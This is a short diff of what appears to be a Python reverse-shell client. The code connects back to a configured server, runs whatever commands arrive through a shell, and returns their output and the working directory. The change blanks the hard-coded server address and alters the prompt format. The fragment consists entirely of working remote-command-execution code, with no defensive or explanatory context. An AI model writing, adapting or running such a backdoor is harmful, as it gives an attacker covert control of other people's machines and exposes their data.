@@ -3,7 +3,7 @@ import subprocess
 import os
 import sys
 
-SERVER_HOST = "192.168.1.133"   # Server IP
+SERVER_HOST = ""   # Server IP
 SERVER_PORT = 5003 # Server Port
 BUFFER_SIZE = 10240 # Buffer Size
 
@@ -23,6 +23,6 @@ while True:
             cmd = subprocess.Popen(command[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             output_bytes = cmd.stdout.read() + cmd.stderr.read()
             output_str = str(output_bytes, "utf-8", "ignore")     
-            s.send(str.encode(output_str + 'Shell> ' +  str(os.getcwd())))
+            s.send(str.encode(output_str +  str(os.getcwd()) + '> '))
         except:
             continue
